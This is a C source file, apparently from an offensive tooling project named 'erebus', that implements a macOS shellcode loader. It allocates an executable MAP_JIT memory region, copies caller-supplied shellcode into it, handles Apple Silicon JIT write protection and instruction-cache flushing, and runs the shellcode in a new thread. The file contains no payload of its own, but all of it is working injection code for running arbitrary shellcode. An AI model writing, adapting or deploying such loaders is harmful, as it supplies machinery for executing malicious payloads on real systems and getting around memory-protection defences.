#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include "../../include/injection.h"

static void *_run(void *arg)
{
    void (*fn)(void) = (void (*)(void))arg;
    fn();
    return NULL;
}

/*
 * Allocate a MAP_JIT region, copy shellcode, then launch via pthread.
 *
 * MAP_JIT is required on macOS 10.14+ for user-space JIT pages.  On
 * Apple Silicon (arm64) the write permission must be toggled via
 * pthread_jit_write_protect_np because W^X is enforced in hardware.
 *
 * On x86_64 a plain RWX mmap works, but MAP_JIT is accepted too.
 */
void erebus_mmap_pthread(const unsigned char *sc, size_t sc_len)
{
    void *mem = mmap(NULL, sc_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT,
                     -1, 0);
    if (mem == MAP_FAILED) return;

#if defined(__arm64__) || defined(__aarch64__)
    /* Disable write protection, write, re-enable, flush icache. */
    pthread_jit_write_protect_np(0);
    memcpy(mem, sc, sc_len);
    pthread_jit_write_protect_np(1);
    sys_icache_invalidate(mem, sc_len);
#else
    memcpy(mem, sc, sc_len);
    __builtin___clear_cache((char *)mem, (char *)mem + sc_len);
#endif

    pthread_t tid;
    if (pthread_create(&tid, NULL, _run, mem) != 0) {
        munmap(mem, sc_len);
        return;
    }
    pthread_join(tid, NULL);
    munmap(mem, sc_len);
}
